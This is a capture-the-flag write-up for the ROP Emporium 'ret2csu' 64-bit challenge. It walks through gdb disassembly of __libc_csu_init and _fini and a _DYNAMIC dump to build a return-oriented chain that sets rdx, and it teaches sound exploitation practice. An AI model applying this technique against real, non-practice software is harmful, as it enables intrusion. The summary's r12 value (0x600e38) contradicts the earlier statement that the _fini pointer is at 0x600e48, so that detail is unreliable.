# ret2csu - 64bit

The challenge is testing our ability to load a value into a register of a tiny binary. Spoilers, we do not have the correct gadgets to load the parameter into the 3rd register `rdx`.

We need to implement an attack known as `ret2csu`. This is effectively using gadgets present in what is known as "attached code".

We need to look at the `__libc_csu_init` decompilation.

```
gdb-peda$ disas __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x0000000000400840 <+0>:	push   r15
   0x0000000000400842 <+2>:	push   r14
   0x0000000000400844 <+4>:	mov    r15,rdx
   0x0000000000400847 <+7>:	push   r13
   0x0000000000400849 <+9>:	push   r12
   0x000000000040084b <+11>:	lea    r12,[rip+0x2005be]        # 0x600e10
   0x0000000000400852 <+18>:	push   rbp
   0x0000000000400853 <+19>:	lea    rbp,[rip+0x2005be]        # 0x600e18
   0x000000000040085a <+26>:	push   rbx
   0x000000000040085b <+27>:	mov    r13d,edi
   0x000000000040085e <+30>:	mov    r14,rsi
   0x0000000000400861 <+33>:	sub    rbp,r12
   0x0000000000400864 <+36>:	sub    rsp,0x8
   0x0000000000400868 <+40>:	sar    rbp,0x3
   0x000000000040086c <+44>:	call   0x400560 <_init>
   0x0000000000400871 <+49>:	test   rbp,rbp
   0x0000000000400874 <+52>:	je     0x400896 <__libc_csu_init+86>
   0x0000000000400876 <+54>:	xor    ebx,ebx
   0x0000000000400878 <+56>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400880 <+64>:	mov    rdx,r15
   0x0000000000400883 <+67>:	mov    rsi,r14
   0x0000000000400886 <+70>:	mov    edi,r13d
   0x0000000000400889 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040088d <+77>:	add    rbx,0x1
   0x0000000000400891 <+81>:	cmp    rbp,rbx
   0x0000000000400894 <+84>:	jne    0x400880 <__libc_csu_init+64>
   0x0000000000400896 <+86>:	add    rsp,0x8
   0x000000000040089a <+90>:	pop    rbx
   0x000000000040089b <+91>:	pop    rbp
   0x000000000040089c <+92>:	pop    r12
   0x000000000040089e <+94>:	pop    r13
   0x00000000004008a0 <+96>:	pop    r14
   0x00000000004008a2 <+98>:	pop    r15
   0x00000000004008a4 <+100>:	ret    
End of assembler dump.
```

We have two sets of gadgets we can use:


```
0x0000000000400880 <+64>:	mov    rdx,r15
0x0000000000400883 <+67>:	mov    rsi,r14
0x0000000000400886 <+70>:	mov    edi,r13d
0x0000000000400889 <+73>:	call   QWORD PTR [r12+rbx*8]
0x000000000040088d <+77>:	add    rbx,0x1
0x0000000000400891 <+81>:	cmp    rbp,rbx
0x0000000000400894 <+84>:	jne    0x400880 <__libc_csu_init+64>
0x0000000000400896 <+86>:	add    rsp,0x8
[...]
```

And

```
0x040089a <+90>:	pop    rbx
0x040089b <+91>:	pop    rbp
0x040089c <+92>:	pop    r12
0x040089e <+94>:	pop    r13
0x04008a0 <+96>:	pop    r14
0x04008a2 <+98>:	pop    r15
0x04008a4 <+100>:	ret    
```

Therefore, if we can `pop` our value into `r15` we can `mov` it into `rdx` with the first chain.

However, we have a few issues, the first chain does not end with a `ret` and flows into the second, therefore it looks a little more like this:

Chain #1
```
0x0400880 <+64>:	mov    rdx,r15
0x0400883 <+67>:	mov    rsi,r14
0x0400886 <+70>:	mov    edi,r13d
0x0400889 <+73>:	call   QWORD PTR [r12+rbx*8]
0x040088d <+77>:	add    rbx,0x1
0x0400891 <+81>:	cmp    rbp,rbx
0x0400894 <+84>:	jne    0x400880 <__libc_csu_init+64>
0x0400896 <+86>:	add    rsp,0x8
0x040089a <+90>:	pop    rbx
0x040089b <+91>:	pop    rbp
0x040089c <+92>:	pop    r12
0x040089e <+94>:	pop    r13
0x04008a0 <+96>:	pop    r14
0x04008a2 <+98>:	pop    r15
0x04008a4 <+100>:	ret  
```

Chain #2
```
0x040089a <+90>:	pop    rbx
0x040089b <+91>:	pop    rbp
0x040089c <+92>:	pop    r12
0x040089e <+94>:	pop    r13
0x04008a0 <+96>:	pop    r14
0x04008a2 <+98>:	pop    r15
0x04008a4 <+100>:	ret    
```

We have a couple of hoops to jump through if we want to deal with Chain #1 correctly.

The first is the `call` command:

```
0x0400889 <+73>:	call   QWORD PTR [r12+rbx*8]
```

This caused some issues, but after reading through a post by [w3ndige](https://www.rootnetsec.com/ropemporium-ret2csu/) that talked about another [post](https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html). This can be solved by redirecting the flow to the `_fini` section of the binary.

If we decompile the function we see it does literally nothing:

```
gdb-peda$ disas _fini
Dump of assembler code for function _fini:
   0x04008b4 <+0>:	sub    rsp,0x8
   0x04008b8 <+4>:	add    rsp,0x8
   0x04008bc <+8>:	ret    
End of assembler dump.
```

This is a great place to redirect the flow to prevent a `SIGSEGV`.

The next hoop is a set of comparison instructions:

```
0x040088d <+77>:	add    rbx,0x1
0x0400891 <+81>:	cmp    rbp,rbx
0x0400894 <+84>:	jne    0x400880 <__libc_csu_init+64>
```
We can find a pointer to this address in the `.dynamic` section of the executable

This can be seen using `gdb` at a breakpoint:

```
gdb-peda$ x/10g &_DYNAMIC
0x600e20:       0x0000000000000001      0x0000000000000001
0x600e30:       0x000000000000000c      0x0000000000400560
0x600e40:       0x000000000000000d      0x00000000004008b4
0x600e50:       0x0000000000000019      0x0000000000600e10
0x600e60:       0x000000000000001b      0x0000000000000008
```

Position `0x600e48` has a pointer (`0x00000000004008b4`) to the method `_fini`. This will prevent the program from segfaulting.

We need to, therefore, make sure that `rbx` and `rbp` are equal. Means starting `rbp` as `0x1` and `rbx` as `0x0`.

The final issues is a `add rsp, 0x8` command. This will move the stack down eight values and, thus, padding will be required to keep the exploit on track.

In summary:

`r15` - 0xdeadcafebabebeef
`rbp` - 0x1
`rbx` - 0x0
`r12` - Address of `_fini` (0x0600e38)

Plus padding is correct places. This will be needed for redundant `pop` and `add rsp, 0x8` commands.

Adding these all together in the `exploit.py` gives a working exploit!